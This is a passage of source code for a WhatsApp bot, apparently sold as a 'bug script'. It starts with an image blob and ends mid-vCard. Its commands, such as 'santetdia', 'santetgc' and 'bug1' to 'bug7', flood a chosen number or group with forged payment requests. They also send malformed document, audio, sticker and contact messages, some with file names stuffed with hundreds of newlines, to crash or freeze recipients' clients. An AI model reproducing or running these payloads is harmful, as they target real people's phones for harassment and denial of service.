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",
						"itemCount": 7,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"priceAmount1000": "10000000",
						"message": `©Kizu-MD`,
"jpegThumbnail":fs.readFileSync('./image/thumbnail.jpg'),
"orderTitle": `Bug By Hw Mods`,
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",
						"totalAmount1000": "35000000",
						"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'santetdia': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `©Kizu-MD`,
}
}}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `Created ©NainOfc`,
}
}}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'docu': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 RAHMXMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'duc': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
						"mimetype": "*/*",
						"title": "IMG-20220802-WA0052.jpeg",
						"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
						"pageCount": 0,
						"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
						"fileName": `🔥 RAHMXMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
						"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
						"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
						"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug1': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'bug2': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© ${global.creator}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
case 'bug3': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© RAHXMODS${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug4': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© RAHXMODS`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© RAHXMODS${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
case 'bug5': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
case 'bug6': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/6288223674569",
"matchedText": "https://wa.me/6288223674569",
"description": "Beli Sc Bug? Chat Wa Owner Ya Kak",
"title": `© Kizu-MD`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
case 'bug7': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© Kizu-MD`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:liaacans\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAGAAYAMBIgACEQEDEQH/xAAcAAACAwEAAwAAAAAAAAAAAAAFBgMEBwIAAQj/xAAzEAACAQMDAwIDBwQDAQAAAAABAgMABBEFEiEGMUETUSJhgQcyUnGRocEUQrHwFXLRI//EABkBAAIDAQAAAAAAAAAAAAAAAAECAAMEBf/EACARAAICAgMBAQEBAAAAAAAAAAABAhEDIRIxQQRhIkL/2gAMAwEAAhEDEQA/AM9O1rrbGD6UR2rnzz3q6dQS0UYO5lwf0PmqD/8AxB+Hmg17ekMVVst7+1Y+DySOhzWONhO61h1ZfjJYFgu3uwbxUcVvfXKgliqBdo8nb7GqmlWxllWWQbjnPPk0+aVboFUsBxzVvGMdIr5ynt9C/b9MXM0W6QysSuOTj8qtv0dOyepGhUAB87ueDz+1O0dzEi4yB/7VpLxGRVBGACPp3qWShSt/s6up2b022gJkfEfPio7/AKB1awVngdmK+Ac8Af4rRrDUQqLk4JAz+lETepKOcGi6o